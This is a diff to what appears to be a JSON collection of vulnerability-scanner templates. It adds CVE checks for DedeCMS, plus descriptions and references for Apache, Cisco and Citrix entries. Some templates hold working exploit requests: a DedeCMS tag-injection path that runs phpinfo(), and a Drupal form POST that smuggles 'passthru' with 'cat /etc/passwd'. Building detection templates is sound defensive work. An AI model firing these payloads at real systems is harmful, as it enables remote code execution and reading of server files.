@@ -2375,6 +2375,43 @@
       ]
     },
     {
+      "id": "CVE-2018-6910",
+      "info": {
+        "author": "pikpikcu",
+        "description": "DedeCMS 5.7 allows remote attackers to discover the full path via a direct request for include/downmix.inc.php or inc/inc_archives_functions.php",
+        "name": "DedeCMS 5.7 path disclosure",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-6910",
+        "severity": "medium",
+        "tags": "cve,cve2018,dedecms"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "downmix.inc.php",
+                "Call to undefined function helper()"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/include/downmix.inc.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-7251",
       "info": {
         "author": "pd-team",
@@ -2471,6 +2508,42 @@
           "matchers-condition": "and",
           "raw": [
             "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost:  {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json\nReferer:  {{Hostname}}/user/register\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663\nContent-Length: 626\nConnection: close\n\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#post_render][]\"\n\npassthru\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#type]\"\n\nmarkup\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"mail[#markup]\"\n\ncat /etc/passwd\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"form_id\"\n\nuser_register_form\n-----------------------------99533888113153068481322586663\nContent-Disposition: form-data; name=\"_drupal_ajax\"\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-7700",
+      "info": {
+        "author": "pikpikcu",
+        "name": "DedeCMS V5.7SP2 RCE",
+        "reference": "https://laworigin.github.io/2018/03/07/CVE-2018-7700-dedecms%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/",
+        "severity": "high",
+        "tags": "cve,cve2018,dedecms,rce"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "phpinfo",
+                "PHP Version"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tag_test_action.php?url=a&token=&partcode={dede:field%20name=%27source%27%20runphp=%27yes%27}phpinfo();{/dede:field}"
           ]
         }
       ]
@@ -5166,8 +5239,9 @@
       "id": "CVE-2020-11991",
       "info": {
         "author": "pikpikcu",
+        "description": "When using the StreamGenerator, the code parse a user-provided XML. A specially crafted XML, including external system entities, could be used to access any file on the server system.\n",
         "name": "Apache Cocoon 2.1.12 XML Injection",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11991",
+        "reference": "https://lists.apache.org/thread.html/r77add973ea521185e1a90aca00ba9dae7caa8d8b944d92421702bb54%40%3Cusers.cocoon.apache.org%3E",
         "severity": "high"
       },
       "requests": [
@@ -6186,6 +6260,9 @@
         "author": "pd-team",
         "description": "Data sent with contentId to /control/stream is not sanitized, allowing XSS attacks in Apache OFBiz 16.11.01 to 16.11.07.",
         "name": "Apache OFBiz Reflected XSS",
+        "reference": [
+          "https://lists.apache.org/thread.html/rf867d9a25fa656b279b16e27b8ff6fcda689cfa4275a26655c685702%40%3Cdev.ofbiz.apache.org%3E"
+        ],
         "severity": "medium",
         "tags": "cve,cve2020,apache,xss"
       },
@@ -6757,8 +6834,11 @@
       "id": "CVE-2020-26073",
       "info": {
         "author": "madrobot",
+        "description": "A vulnerability in the application data endpoints of Cisco SD-WAN vManage Software could allow an unauthenticated, remote attacker to gain access to sensitive information.\n",
         "name": "Cisco SD-WAN vManage Software Directory Traversal",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26073",
+        "reference": [
+          "https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html"
+        ],
         "severity": "high",
         "tags": "cve,cve2020,cisco,lfi"
       },
@@ -6805,8 +6885,7 @@
               "name": "alerta-version",
               "part": "body",
               "regex": [
-                "name\":\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\"",
-                "name\": \"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
+                "name\":\\s*\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
               ],
               "type": "regex"
             }
@@ -6821,16 +6900,14 @@
             {
               "condition": "or",
               "regex": [
-                "name\":\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\"",
-                "name\": \"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
+                "name\":\\s*\"Alerta ([0-7]\\.[0-9]\\.[0-9]|8\\.0.[0-9])\""
               ],
               "type": "regex"
             },
             {
               "condition": "or",
               "regex": [
-                "provider\":\"ldap\"",
-                "provider\": \"ldap\""
+                "provider\":\\s*\"ldap\""
               ],
               "type": "regex"
             }
@@ -7854,7 +7931,11 @@
       "id": "CVE-2020-8194",
       "info": {
         "author": "dwisiswant0",
+        "description": "Reflected code injection in Citrix ADC and Citrix Gateway versions before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18 and Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allows the modification of a file download.\n",
         "name": "Citrix ADC & NetScaler Gateway Reflected Code Injection",
+        "reference": [
+          "https://support.citrix.com/article/CTX276688"
+        ],
         "severity": "high",
         "tags": "cve,cve2020,citrix"
       },
@@ -8225,6 +8306,9 @@
         "author": "dwisiswant0",
         "description": "Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server",
         "name": "Apache Tomcat RCE by deserialization",
+        "reference": [
+          "http://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html"
+        ],
         "severity": "high",
         "tags": "cve,cve2020,apache"
       },
@@ -8265,6 +8349,10 @@
         "author": "dwisiswant0",
         "description": "XML-RPC request are vulnerable to unsafe deserialization and Cross-Site Scripting issues in Apache OFBiz 17.12.03",
         "name": "Apache OFBiz XML-RPC Java Deserialization",
+        "reference": [
+          "http://packetstormsecurity.com/files/158887/Apache-OFBiz-XML-RPC-Java-Deserialization.html",
+          "http://packetstormsecurity.com/files/161769/Apache-OFBiz-XML-RPC-Java-Deserialization.html"
+        ],
         "severity": "medium",
         "tags": "cve,cve2020,apache"
       },
